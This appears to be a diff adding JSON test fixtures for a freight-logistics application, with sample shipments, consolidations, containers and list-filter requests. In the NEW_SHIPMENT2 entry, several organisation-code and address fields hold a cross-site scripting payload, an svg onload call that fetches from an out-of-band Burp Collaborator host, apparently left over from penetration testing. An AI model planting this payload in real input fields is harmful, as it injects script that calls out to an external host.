@@ -2081,6 +2081,917 @@
       "totalCollect": 0.0
     }
   },
+  "NEW_SHIPMENT2": {
+    "transportMode": "SEA",
+    "status": 0,
+    "guid": "1a53dcdc-19dc-4789-b4e3-6fc7e9b4d4a1",
+    "source": "System",
+    "weightUnit": "KG",
+    "volumeUnit": "M3",
+    "freightLocalCurrency": "INR",
+    "cargoFinanceBooking": false,
+    "sourceTenantId": 69,
+    "intraBranch": false,
+    "additionalDetails": {
+      "paidPlace": "21407269-AB59-49E8-9DE4-BBBF34BD52FC",
+      "placeOfIssue": "21407269-AB59-49E8-9DE4-BBBF34BD52FC",
+      "placeOfSupply": "21407269-AB59-49E8-9DE4-BBBF34BD52FC",
+      "notifyParty": {
+        "id": 648550,
+        "guid": "f967f996-0d14-48c4-ab51-a388440aad67",
+        "orgCode": "HARSH_TEST",
+        "tenantId": 166,
+        "addressCode": "SHORT",
+        "addressId": "18",
+        "orgData": {
+          "Receivables": false,
+          "Email": "contact@godship.com",
+          "CompanyId": 166,
+          "ZipPostCode": "400001",
+          "Address2": "British Columbia",
+          "Payables": true,
+          "City": "Cairo",
+          "label": "Hudson Bay",
+          "Address1": "X-123 Square Central",
+          "UpdateUserIdUsername": "egyptp100_1@dpworld.com",
+          "State": "BC",
+          "FullName": "Hudson Bay",
+          "Country": "CAN",
+          "OrganizationCode": "HARSH_TEST",
+          "Id": 23780,
+          "value": "HARSH_TEST",
+          "InsertUserIdUsername": "egyptp100_1@dpworld.com"
+        },
+        "addressData": {
+          "AddressShortCode": "SHORT",
+          "Email": "contact@godship.com",
+          "OrgFullName": "Hudson Bay",
+          "OrgSource": "Fusion",
+          "ZipPostCode": "400001",
+          "OrgReceivables": false,
+          "SiteIdentifier": "SITE",
+          "City": "British Columbia",
+          "Address1": "Adress 1",
+          "CompanyName": "COMPANY",
+          "State": "British Columbia",
+          "OrgOrganizationCode": "HARSH_TEST",
+          "Country": "CAN",
+          "Id": 35727,
+          "OrgActiveClient": true,
+          "AddressType": 1,
+          "OrgPayables": true
+        }
+      },
+      "masterData": {},
+      "unlocationData": {
+        "placeOfIssue": "PEAB4 Abancay",
+        "paidPlace_country": "PER",
+        "paidPlace": "PEAB4 Abancay",
+        "placeOfIssue_country": "PER",
+        "placeOfSupply": "PEAB4 Abancay",
+        "placeOfSupply_country": "PER"
+      },
+      "tenantIdsData": {},
+      "textData": {},
+      "importBroker": null,
+      "exportBroker": null,
+      "efreightStatus": "EAW"
+    },
+    "carrierDetails": {
+      "id": 1,
+      "masterData": {},
+      "unlocationData": {},
+      "carrierMasterData": {},
+      "origin": "25C74A19-16AE-4CB8-A6C0-357B58B0D031",
+      "originPort": "0E8F5220-D6CE-4D29-9755-B7C32A4B9F4F",
+      "destinationPort": "38C78DB3-E3C2-41D8-A32D-3A139B0AA67A",
+      "destination": "d7837264-3079-467b-ab10-2cd59bcdb49e",
+      "shippingLine": "APL"
+    },
+    "masterData": {
+      "volumeUnit": "M3 (Cubic Meters)",
+      "transportMode": "SEA (SEA)",
+      "source": "System (System)",
+      "weightUnit": "KG (KiloGrams)"
+    },
+    "currenciesMasterData": {},
+    "tenantIdsData": {
+      "sourceTenantId": "HIPL-FF : Hindustan Infralog Private Limited"
+    },
+    "shipmentCreatedOn": "2024-03-20T11:08:53",
+    "createdBy": "hipl2",
+    "textData": {},
+    "customerCategory": "CATEGORY_5",
+    "isShipmentReadOnly": false,
+    "bookingCreatedDate": "2024-03-20T11:08:53",
+    "direction": "CTS",
+    "shipmentType": "BCN",
+    "paymentTerms": "CCX",
+    "jobType": "ABC",
+    "serviceType": "C2P",
+    "client": {
+      "id": 1,
+      "orgCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
+      "addressCode": "Default",
+      "addressId": "20",
+      "orgData": {
+        "Id": 4114,
+        "OrganizationCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
+        "FullName": "penetra",
+        "Address1": "penetra",
+        "Address2": "q",
+        "Country": "NLD",
+        "ZipPostCode": "1600",
+        "Unloco": 79388,
+        "Email": "berke@penetra.nl",
+        "CompanyId": 96,
+        "InsertUserIdUsername": "berk.eksioglu_general@penetra.nl",
+        "label": "penetra",
+        "value": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>"
+      },
+      "addressData": {
+        "Id": 11635,
+        "AddressShortCode": "Default",
+        "CompanyName": "penetra",
+        "AddressType": 2,
+        "AdditionalAddressInfo": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`> Default Address",
+        "Address1": "penetra",
+        "Address2": "q",
+        "Country": "NLD",
+        "ZipPostCode": "1600",
+        "Unloco": "79388",
+        "ContactPhone": "+12341241231",
+        "Email": "berke@penetra.nl",
+        "OrgOrganizationCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
+        "OrgFullName": "penetra",
+        "OrgActiveClient": true,
+        "OrgReceivables": false,
+        "OrgPayables": false,
+        "label": "penetra\npenetra, q\nNLD, 1600\n+12341241231",
+        "value": "Default"
+      }
+    },
+    "consigner": {
+      "id": 1,
+      "orgCode": "22481_1",
+      "addressCode": "VALID",
+      "addressId": "12",
+      "orgData": {
+        "Id": 58,
+        "OrganizationCode": "000043",
+        "FullName": "Juanita Dolores SAC",
+        "Address1": "La esquina",
+        "Address2": "de tu casa",
+        "Country": "PER",
+        "City": "San Borja/Lima",
+        "State": "LM",
+        "Unloco": 83231,
+        "CompanyId": 2,
+        "UpdateUserIdUsername": "dpwperuuser",
+        "label": "Juanita Dolores SAC",
+        "value": "000043"
+      },
+      "addressData": {
+        "Id": 24389,
+        "AddressShortCode": "VALID",
+        "CompanyName": "Juanita Dolores SAC",
+        "AddressType": 1,
+        "SiteIdentifier": "12345",
+        "Address1": "Billing address",
+        "Country": "PER",
+        "City": "San Borja/Lima",
+        "State": "LM",
+        "Unloco": "83231",
+        "OrgOrganizationCode": "000043",
+        "OrgFullName": "Juanita Dolores SAC",
+        "OrgActiveClient": true,
+        "OrgReceivables": true,
+        "OrgPayables": true,
+        "label": "Juanita Dolores SAC\nBilling address, San Borja/Lima, LM\nPER\n",
+        "value": "VALID"
+      }
+    },
+    "containersList": [
+      {
+        "guid": "ec7e67b7-a6cd-489e-989e-f1aa12423cdd",
+        "id": 5,
+        "consolidationId": 3581,
+        "containerCode": "20GP",
+        "containerNumber": "CONT0123459",
+        "descriptionOfGoods": "Description",
+        "netWeightUnit": "KG",
+        "grossWeight": 1000,
+        "grossWeightUnit": "KG",
+        "measurementUnit": "M",
+        "containerCount": 1,
+        "customsReleaseCode": "CR012",
+        "containerStuffingLocation": "INCCU_TER",
+        "containerComments": "Description",
+        "grossVolume": 1000,
+        "grossVolumeUnit": "M3",
+        "minTemp": 35,
+        "minTempUnit": "CEL",
+        "maxTempUnit": "CEL",
+        "hblDeliveryMode": "CFS/CFS",
+        "allocationDate": "2024-08-28T09:05:44",
+        "dgClass": "1.1A",
+        "hazardous": true,
+        "packs": "1",
+        "packsType": "BAG",
+        "marksNums": "Description",
+        "pacrNumber": "PACR12",
+        "allocatedWeight": 28230,
+        "allocatedWeightUnit": "KG",
+        "allocatedVolume": 33,
+        "allocatedVolumeUnit": "M3",
+        "achievedWeight": 28230,
+        "achievedWeightUnit": "KG",
+        "achievedVolume": 33,
+        "achievedVolumeUnit": "M3",
+        "weightUtilization": "100",
+        "volumeUtilization": "100",
+        "handlingInfo": "Description",
+        "isPart": false,
+        "isAttached": true,
+        "eventsList": [],
+        "invoiceNumber": "CINV#1234",
+        "invoiceCurrency": "INR",
+        "invoiceValue": 99999
+      }
+    ],
+    "consignee": {
+      "id": 1,
+      "orgCode": "223532_4",
+      "addressCode": "Default1",
+      "addressId": "15",
+      "orgData": {
+        "Id": 64,
+        "OrganizationCode": "00001",
+        "FullName": "UNILEVER ANDINA PERU SA",
+        "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+        "Country": "IND",
+        "City": "Bairgania",
+        "State": "BR",
+        "ZipPostCode": "51",
+        "Unloco": 64854,
+        "Email": "unilever.epe@gmail.com",
+        "CompanyId": 2,
+        "UpdateUserIdUsername": "dpwperuuser",
+        "label": "UNILEVER ANDINA PERU SA",
+        "value": "00001"
+      },
+      "addressData": {
+        "Id": 25739,
+        "AddressShortCode": "Default1",
+        "CompanyName": "UNILEVER ANDINA PERU SA",
+        "AddressType": 1,
+        "AdditionalAddressInfo": "00001 Default Address",
+        "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+        "Country": "PER",
+        "City": "Carrick-on-Shannon",
+        "State": "LM",
+        "ZipPostCode": "51",
+        "Unloco": "83160",
+        "ContactPhone": "+979788194",
+        "Email": "unilever.epe@gmail.com",
+        "OrgOrganizationCode": "00001",
+        "OrgFullName": "UNILEVER ANDINA PERU SA",
+        "OrgActiveClient": true,
+        "OrgReceivables": true,
+        "OrgPayables": true
+      }
+    },
+    "weight": "",
+    "netWeight": "",
+    "netWeightUnit": "",
+    "volume": "",
+    "volumetricWeight": 0,
+    "volumetricWeightUnit": "M3",
+    "chargable": 0,
+    "chargeableUnit": "M3",
+    "dropdownMetadata": {
+      "direction": {
+        "label": "CTS (Cross Trade)",
+        "value": "CTS"
+      },
+      "additionalDetails": {
+        "importBroker": {
+          "orgCode": null,
+          "addressCode": null
+        },
+        "exportBroker": {
+          "orgCode": null,
+          "addressCode": null
+        },
+        "notifyParty": {
+          "addressId": "18",
+          "orgCode": {
+            "Id": 12310,
+            "OrganizationCode": "{FirstName:3}{Sequence:9}12310",
+            "FullName": "hgj hgj",
+            "Address1": "jhkj jkjkj",
+            "Country": "ABW",
+            "City": "Aruba",
+            "Unloco": 17180,
+            "CompanyId": 89,
+            "PaymentTermsCode": "I10",
+            "InsertUserIdUsername": "dpwevgnuser1",
+            "UpdateUserIdUsername": "dpwevgnuser1",
+            "label": "hgj hgj",
+            "value": "{FirstName:3}{Sequence:9}12310"
+          }
+        }
+      },
+      "shipmentType": {
+        "label": "BCN (Buyer's Consolidation)",
+        "value": "BCN"
+      },
+      "paymentTerms": {
+        "label": "CCX (Collect)",
+        "value": "CCX"
+      },
+      "jobType": {
+        "label": "ABC (A B C)",
+        "value": "ABC"
+      },
+      "serviceType": {
+        "label": "C2P (CFS to Port)",
+        "value": "C2P"
+      },
+      "carrierDetails": {
+        "originPort": {
+          "label": "?len - NOOLN, Olen",
+          "value": "0E8F5220-D6CE-4D29-9755-B7C32A4B9F4F",
+          "Id": 81789,
+          "Country": "NOR"
+        },
+        "origin": {
+          "label": "Brussel (Bruxelles) - BEBRU, Brussel (Bruxelles)  Brussel (Bruxelles)   ",
+          "value": "25C74A19-16AE-4CB8-A6C0-357B58B0D031",
+          "Id": 22500,
+          "Country": "BEL"
+        },
+        "destinationPort": {
+          "label": "?ksfjord - NOOKF, Oksfjord",
+          "value": "38C78DB3-E3C2-41D8-A32D-3A139B0AA67A",
+          "Id": 81690,
+          "Country": "NOR"
+        },
+        "destination": {
+          "label": "\"DP World PFT, ICD Haldia\" - INHAL, \"DP World PFT, ICD Haldia\"- Rail",
+          "value": "d7837264-3079-467b-ab10-2cd59bcdb49e",
+          "Id": 1178650,
+          "Country": "IN"
+        }
+      },
+      "client": {
+        "orgCode": {
+          "Id": 4114,
+          "OrganizationCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
+          "FullName": "penetra",
+          "Address1": "penetra",
+          "Address2": "q",
+          "Country": "NLD",
+          "ZipPostCode": "1600",
+          "Unloco": 79388,
+          "Email": "berke@penetra.nl",
+          "CompanyId": 96,
+          "InsertUserIdUsername": "berk.eksioglu_general@penetra.nl",
+          "label": "penetra",
+          "value": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>"
+        },
+        "addressCode": {
+          "Id": 11635,
+          "AddressShortCode": "Default",
+          "CompanyName": "penetra",
+          "AddressType": 2,
+          "AdditionalAddressInfo": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`> Default Address",
+          "Address1": "penetra",
+          "Address2": "q",
+          "Country": "NLD",
+          "ZipPostCode": "1600",
+          "Unloco": "79388",
+          "ContactPhone": "+12341241231",
+          "Email": "berke@penetra.nl",
+          "OrgOrganizationCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
+          "OrgFullName": "penetra",
+          "OrgActiveClient": true,
+          "OrgReceivables": false,
+          "OrgPayables": false,
+          "label": "penetra\npenetra, q\nNLD, 1600\n+12341241231",
+          "value": "Default"
+        }
+      },
+      "consigner": {
+        "orgCode": {
+          "Id": 58,
+          "OrganizationCode": "000043",
+          "FullName": "Juanita Dolores SAC",
+          "Address1": "La esquina",
+          "Address2": "de tu casa",
+          "Country": "PER",
+          "City": "San Borja/Lima",
+          "State": "LM",
+          "Unloco": 83231,
+          "CompanyId": 2,
+          "UpdateUserIdUsername": "dpwperuuser",
+          "label": "Juanita Dolores SAC",
+          "value": "000043"
+        },
+        "addressCode": {
+          "Id": 24389,
+          "AddressShortCode": "VALID",
+          "CompanyName": "Juanita Dolores SAC",
+          "AddressType": 1,
+          "SiteIdentifier": "12345",
+          "Address1": "Billing address",
+          "Country": "PER",
+          "City": "San Borja/Lima",
+          "State": "LM",
+          "Unloco": "83231",
+          "OrgOrganizationCode": "000043",
+          "OrgFullName": "Juanita Dolores SAC",
+          "OrgActiveClient": true,
+          "OrgReceivables": true,
+          "OrgPayables": true,
+          "label": "Juanita Dolores SAC\nBilling address, San Borja/Lima, LM\nPER\n",
+          "value": "VALID"
+        }
+      },
+      "consignee": {
+        "orgCode": {
+          "Id": 64,
+          "OrganizationCode": "00001",
+          "FullName": "UNILEVER ANDINA PERU SA",
+          "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+          "Country": "IND",
+          "City": "Bairgania",
+          "State": "BR",
+          "ZipPostCode": "51",
+          "Unloco": 64854,
+          "Email": "unilever.epe@gmail.com",
+          "CompanyId": 2,
+          "UpdateUserIdUsername": "dpwperuuser",
+          "label": "UNILEVER ANDINA PERU SA",
+          "value": "00001"
+        }
+      }
+    },
+    "clientDpsAddressId": null,
+    "creditTerms": "",
+    "consignorDpsAddressId": null,
+    "notifyPartyDpsAddressId": null,
+    "consigneeDpsAddressId": null,
+    "destinationPortCountry": "NOR",
+    "eventsList": [],
+    "shipmentAddresses": [],
+    "packingList": [
+      {
+        "id": 1527,
+        "guid": "9bce7680-fb3e-4b80-96a0-919d4011ec66",
+        "shipmentId": 5534,
+        "packs": "1",
+        "packsType": "BAG",
+        "weightUnit": "KG",
+        "volumeUnit": "M3",
+        "commodity": "847040",
+        "lengthUnit": "M",
+        "widthUnit": "M",
+        "heightUnit": "M",
+        "minTempUnit": "CEL",
+        "maxTempUnit": "CEL",
+        "netWeightUnit": "KG",
+        "containerId": 151347,
+        "commodityGroup": "FAK",
+        "isDimension": true,
+        "hscode": "234"
+      }
+    ],
+    "routingsList": [
+      {
+        "id": 113766,
+        "guid": "6ed5c624-611a-4c30-a970-cd828279aec9",
+        "shipmentId": 5534,
+        "leg": 1,
+        "mode": "AIR",
+        "routingStatus": "PLD",
+        "pol": "0E8F5220-D6CE-4D29-9755-B7C32A4B9F4F",
+        "pod": "38C78DB3-E3C2-41D8-A32D-3A139B0AA67A",
+        "eta": "2024-05-04 00:00:00",
+        "etd": "2024-05-01 00:00:00",
+        "ata": "2024-05-04 00:00:00",
+        "atd": "2024-05-11 00:00:00",
+        "isLinked": true,
+        "aircraftRegistration": "ADV123",
+        "flightNumber": "1443",
+        "aircraftType": "CAO",
+        "carrier": "Air India",
+        "domestic": false,
+        "carriage": "MAIN_CARRIAGE"
+      }
+    ]
+  },
+  "NEW_CONSOLIDATION_CREATE": {
+    "transportMode": "SEA",
+    "containerCategory": "FCL",
+    "shipmentType": "STD",
+    "sourceTenantId": 66,
+    "intraBranch": false,
+    "carrierDetails": {
+      "masterData": {},
+      "unlocationData": {},
+      "carrierMasterData": {},
+      "origin": "AEJEA_POR",
+      "originPort": "AEJEA_POR",
+      "destinationPort": "EGDMA_POR",
+      "destination": "EGDMA_POR",
+      "shippingLine": "APL",
+      "vessel": "511011055",
+      "etd": "2024-03-31T00:00:00",
+      "ata": "2024-03-29T00:12:00"
+    },
+    "createdBy": "dpwcanuser",
+    "createdAt": "2024-03-30T05:50:59",
+    "masterData": {
+      "containerCategory": "FCL (Full Container Load)",
+      "transportMode": "SEA (Sea)"
+    },
+    "unlocationData": {},
+    "currenciesMasterData": {},
+    "tenantIdsData": {
+      "sourceTenantId": "DP WORLD LOGISTICS CANADA INC"
+    },
+    "textData": {},
+    "consolidationType": "CHT",
+    "payment": "PPD",
+    "deliveryMode": "CFS/CFS",
+    "declarationType": "FZ",
+    "creditor": {
+      "orgCode": "00001",
+      "addressCode": "Default1",
+      "orgData": {
+        "Id": 10516,
+        "OrganizationCode": "00001",
+        "FullName": "UNILEVER ANDINA PERU SA",
+        "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+        "Country": "IND",
+        "City": "Bairgania",
+        "State": "BR",
+        "ZipPostCode": "51",
+        "Unloco": 64854,
+        "Email": "unilever.epe@gmail.com",
+        "CompanyId": 66,
+        "InsertUserIdUsername": "dpwcanuser",
+        "UpdateUserIdUsername": "dpwcanuser",
+        "label": "UNILEVER ANDINA PERU SA",
+        "value": "00001"
+      },
+      "addressData": {
+        "Id": 25749,
+        "AddressShortCode": "Default1",
+        "CompanyName": "UNILEVER ANDINA PERU SA",
+        "AddressType": 1,
+        "AdditionalAddressInfo": "00001 Default Address",
+        "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+        "Country": "PER",
+        "City": "Carrick-on-Shannon",
+        "State": "LM",
+        "ZipPostCode": "51",
+        "Unloco": "83160",
+        "ContactPhone": "979788194",
+        "Email": "unilever.epe@gmail.com",
+        "OrgOrganizationCode": "00001",
+        "OrgFullName": "UNILEVER ANDINA PERU SA",
+        "OrgActiveClient": true,
+        "label": "UNILEVER ANDINA PERU SA\nAV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU, Carrick-on-Shannon, LM\nPER, 51\n979788194",
+        "value": "Default1"
+      }
+    },
+    "sendingAgent": {
+      "orgCode": "00004",
+      "addressCode": "Default",
+      "orgData": {
+        "Id": 10517,
+        "OrganizationCode": "00004",
+        "FullName": "Juanita Dolores SAC",
+        "Address1": "La esquina",
+        "Address2": "de tu casa",
+        "Country": "PER",
+        "City": "San Borja/Lima",
+        "State": "LM",
+        "Unloco": 83231,
+        "Email": "abc@dpworld.com",
+        "CompanyId": 66,
+        "InsertUserIdUsername": "dpwcanuser",
+        "UpdateUserIdUsername": "dpwcanuser",
+        "label": "Juanita Dolores SAC",
+        "value": "00004"
+      },
+      "addressData": {
+        "Id": 25750,
+        "AddressShortCode": "Default",
+        "CompanyName": "Juanita Dolores SAC",
+        "AddressType": 2,
+        "AdditionalAddressInfo": "00004 Default Address",
+        "Address1": "La esquina",
+        "Address2": "de tu casa",
+        "Country": "PER",
+        "City": "San Borja/Lima",
+        "State": "LM",
+        "Unloco": "83231",
+        "ContactPhone": "+5114410334",
+        "OrgOrganizationCode": "00004",
+        "OrgFullName": "Juanita Dolores SAC",
+        "OrgActiveClient": true,
+        "label": "Juanita Dolores SAC\nLa esquina, de tu casa, San Borja/Lima, LM\nPER\n+5114410334",
+        "value": "Default"
+      }
+    },
+    "receivingAgent": {
+      "orgCode": "14290",
+      "addressCode": "Default",
+      "orgData": {
+        "Id": 14290,
+        "OrganizationCode": "14290",
+        "FullName": "usa",
+        "Address1": "usa",
+        "Country": "IND",
+        "CompanyId": 66,
+        "InsertUserIdUsername": "dpwcanuser",
+        "UpdateUserIdUsername": "dpwcanuser",
+        "label": "usa",
+        "value": "14290"
+      },
+      "addressData": {
+        "Id": 31484,
+        "AddressShortCode": "Default",
+        "CompanyName": "usa",
+        "AddressType": 2,
+        "AdditionalAddressInfo": "Default Address",
+        "Address1": "usa",
+        "Country": "USA",
+        "OrgOrganizationCode": "14290",
+        "OrgFullName": "usa",
+        "OrgActiveClient": true
+      }
+    },
+    "receivingBranch": 66,
+    "documentationPartner": 484,
+    "triangulationPartnerList": [{
+      "triangulationPartner": 2312,
+      "isAccepted": false
+    }],
+    "triangulationPartner": 2312,
+    "departureDetails": {
+      "ctoid": {},
+      "cfsid": {},
+      "containerYardId": {},
+      "transportPortId": {}
+    },
+    "dropdownMetadata": {
+      "consolidationType": {
+        "label": "CHT (Charter)",
+        "value": "CHT"
+      },
+      "payment": {
+        "label": "PPD (Prepaid)",
+        "value": "PPD"
+      },
+      "deliveryMode": {
+        "label": "CFS/CFS (CFS/CFS)",
+        "value": "CFS/CFS"
+      },
+      "declarationType": {
+        "label": "FZ (FreeZone)",
+        "value": "FZ"
+      },
+      "creditor": {
+        "orgCode": {
+          "Id": 10516,
+          "OrganizationCode": "00001",
+          "FullName": "UNILEVER ANDINA PERU SA",
+          "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+          "Country": "IND",
+          "City": "Bairgania",
+          "State": "BR",
+          "ZipPostCode": "51",
+          "Unloco": 64854,
+          "Email": "unilever.epe@gmail.com",
+          "CompanyId": 66,
+          "InsertUserIdUsername": "dpwcanuser",
+          "UpdateUserIdUsername": "dpwcanuser",
+          "label": "UNILEVER ANDINA PERU SA",
+          "value": "00001"
+        },
+        "addressCode": {
+          "Id": 25749,
+          "AddressShortCode": "Default1",
+          "CompanyName": "UNILEVER ANDINA PERU SA",
+          "AddressType": 1,
+          "AdditionalAddressInfo": "00001 Default Address",
+          "Address1": "AV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU",
+          "Country": "PER",
+          "City": "Carrick-on-Shannon",
+          "State": "LM",
+          "ZipPostCode": "51",
+          "Unloco": "83160",
+          "ContactPhone": "979788194",
+          "Email": "unilever.epe@gmail.com",
+          "OrgOrganizationCode": "00001",
+          "OrgFullName": "UNILEVER ANDINA PERU SA",
+          "OrgActiveClient": true,
+          "label": "UNILEVER ANDINA PERU SA\nAV PASEO DE LA REPUBLICA NRO 5895 INT 4 URB SAN ANTONIO-MIRAFLORES -PERU, Carrick-on-Shannon, LM\nPER, 51\n979788194",
+          "value": "Default1"
+        }
+      },
+      "sendingAgent": {
+        "orgCode": {
+          "Id": 10517,
+          "OrganizationCode": "00004",
+          "FullName": "Juanita Dolores SAC",
+          "Address1": "La esquina",
+          "Address2": "de tu casa",
+          "Country": "PER",
+          "City": "San Borja/Lima",
+          "State": "LM",
+          "Unloco": 83231,
+          "Email": "abc@dpworld.com",
+          "CompanyId": 66,
+          "InsertUserIdUsername": "dpwcanuser",
+          "UpdateUserIdUsername": "dpwcanuser",
+          "label": "Juanita Dolores SAC",
+          "value": "00004"
+        },
+        "addressCode": {
+          "Id": 25750,
+          "AddressShortCode": "Default",
+          "CompanyName": "Juanita Dolores SAC",
+          "AddressType": 2,
+          "AdditionalAddressInfo": "00004 Default Address",
+          "Address1": "La esquina",
+          "Address2": "de tu casa",
+          "Country": "PER",
+          "City": "San Borja/Lima",
+          "State": "LM",
+          "Unloco": "83231",
+          "ContactPhone": "+5114410334",
+          "OrgOrganizationCode": "00004",
+          "OrgFullName": "Juanita Dolores SAC",
+          "OrgActiveClient": true,
+          "label": "Juanita Dolores SAC\nLa esquina, de tu casa, San Borja/Lima, LM\nPER\n+5114410334",
+          "value": "Default"
+        }
+      },
+      "receivingAgent": {
+        "orgCode": {
+          "Id": 14290,
+          "OrganizationCode": "14290",
+          "FullName": "usa",
+          "Address1": "usa",
+          "Country": "IND",
+          "CompanyId": 66,
+          "InsertUserIdUsername": "dpwcanuser",
+          "UpdateUserIdUsername": "dpwcanuser",
+          "label": "usa",
+          "value": "14290"
+        }
+      },
+      "receivingBranch": {
+        "label": "DP WORLD LOGISTICS CANADA INC",
+        "value": 66,
+        "TenantId": 66
+      },
+      "documentationPartner": {
+        "label": "Canada Branch",
+        "value": 484,
+        "TenantId": 484
+      },
+      "triangulationPartner": {
+        "label": "DPWCANADA_SS",
+        "value": 2312,
+        "TenantId": 2312
+      },
+      "triangulationPartnerList": {
+        "label": "DPWCANADA_SS",
+        "value": [{
+          "triangulationPartner": 2312,
+          "isAccepted": false
+        }],
+        "TenantId": 2312
+      },
+      "carrierDetails": {
+        "origin": {
+          "label": "AEJEA Jebel Ali DP World Port - AEJEA, AEJEA Jebel Ali DP World Port",
+          "value": "AEJEA_POR",
+          "Id": 113140,
+          "Country": "AE"
+        },
+        "originPort": {
+          "label": "AEJEA Jebel Ali DP World Port - AEJEA, AEJEA Jebel Ali DP World Port",
+          "value": "AEJEA_POR",
+          "Id": 113140,
+          "Country": "AE"
+        },
+        "destinationPort": {
+          "label": "Boston - USOWQ, boston sea port",
+          "value": "EGDMA_POR",
+          "Id": 72,
+          "Country": "USA"
+        },
+        "destination": {
+          "label": "Boston - USOWQ, boston sea port",
+          "value": "EGDMA_POR",
+          "Id": 72,
+          "Country": "USA"
+        },
+        "vessel": {
+          "label": "\" SVS FROBISHER \"",
+          "value": "511011055"
+        },
+        "shippingLine": {
+          "label": "APL (APL)",
+          "value": "APL",
+          "Id": 53488
+        }
+      }
+    }
+  },
+  "NEW_CONTAINER_CREATE": {
+    "consolidationId": 1,
+    "containerCode": "20DPW",
+    "hblDeliveryMode": "CY/CFS",
+    "containerNumber": "",
+    "containerCount": "3",
+    "noOfPackages": "4",
+    "grossWeightUnit": "KG",
+    "netWeightUnit": "KG",
+    "grossVolumeUnit": "M3",
+    "packs": 1,
+    "minTempUnit": "CEL",
+    "weightUnit": "KG",
+    "volumeUnit": "M3",
+    "maxTempUnit": "CEL",
+    "measurementUnit": "M",
+    "allocatedWeight": 0,
+    "allocatedWeightUnit": "KG",
+    "allocatedVolume": 0,
+    "allocatedVolumeUnit": "L",
+    "achievedWeight": 10,
+    "achievedVolume": 15
+  },
+  "CONTAINER": {
+    "id": 1,
+    "guid": "a4574234-9bba-4d42-b287-3a773e41e4e2",
+    "consolidationId": 2248,
+    "bookingId": 147775,
+    "containerCode": "20FR",
+    "containerNumber": "CIUY2121267",
+    "noOfPackages": 50,
+    "netWeight": 500.00,
+    "netWeightUnit": "KG",
+    "grossWeight": 500.00,
+    "grossWeightUnit": "KG",
+    "commodityCode": "680530",
+    "hsCode": "",
+    "containerCount": 1,
+    "customsReleaseCode": "23",
+    "containerStuffingLocation": "YW3g7SxpzQ",
+    "grossVolume": 100.000,
+    "grossVolumeUnit": "M3",
+    "minTemp": 21,
+    "hblDeliveryMode": "CFS/DOOR",
+    "allocationDate": "2024-05-03 12:44:53",
+    "tareWeight": 21.00,
+    "packs": "50",
+    "packsType": "BAG",
+    "pacrNumber": "212",
+    "commodityGroup": "FAK",
+    "isContractEnforced": true,
+    "commodityTypeData": {
+      "commodityCode": "Abrasive powder or grain natural or artificial on a base of materials n.e.s. in heading no. 6805 whether or not cut to shape or sewn or otherwise made up"
+    },
+    "containerCodeData": {
+      "containerCode": "20FR - Twenty foot flatrack"
+    },
+    "contractEnforcedQuantityLimit": 1,
+    "textFieldData": {},
+    "isAttached": true,
+    "eventsList": [],
+    "invoiceNumber": "312",
+    "invoiceCurrency": "AED",
+    "invoiceValue": 32,
+    "tenantId": 908,
+    "achievedWeightUnit": "KG",
+    "achievedVolumeUnit": "M3",
+    "allocatedWeightUnit": "KG",
+    "allocatedVolumeUnit": "M3",
+    "shipmentsList": [
+      {
+        "id": 1,
+        "shipmentType": "LCL"
+      }
+    ]
+  },
   "NEW_SHIPMENT": {
     "transportMode": "SEA",
     "status": 0,
@@ -10779,6 +11690,70 @@
     },
     "containsText": ""
   },
+  "LIST_REQUEST_14" : {
+    "pageNo": 1,
+    "pageSize": 25,
+    "filterCriteria": [
+      {
+        "innerFilter": [
+          {
+            "criteria": {
+              "fieldName": "status",
+              "operator": "ISEMPTY"
+            }
+          }
+        ]
+      }
+    ],
+    "sortRequest": {
+      "fieldName": "status",
+      "order": "ASC"
+    },
+    "containsText": ""
+  },
+  "LIST_REQUEST_15" : {
+    "pageNo": 1,
+    "pageSize": 25,
+    "filterCriteria": [
+      {
+        "innerFilter": [
+          {
+            "criteria": {
+              "fieldName": "status",
+              "operator": "ISNOTEMPTY"
+            }
+          }
+        ]
+      }
+    ],
+    "sortRequest": {
+      "fieldName": "status",
+      "order": "ASC"
+    },
+    "containsText": ""
+  },
+  "LIST_REQUEST_16" : {
+    "pageNo": 1,
+    "pageSize": 25,
+    "filterCriteria": [
+      {
+        "innerFilter": [
+          {
+            "criteria": {
+              "fieldName": "status",
+              "operator": "ISNOTEQUALORNULL",
+              "value": "VALUE"
+            }
+          }
+        ]
+      }
+    ],
+    "sortRequest": {
+      "fieldName": "status",
+      "order": "ASC"
+    },
+    "containsText": ""
+  },
   "QUOTE_CONTRACTS": {
     "id": 1,
     "guid": "63b0083b-08ab-49e4-a457-a7484cb172c8",
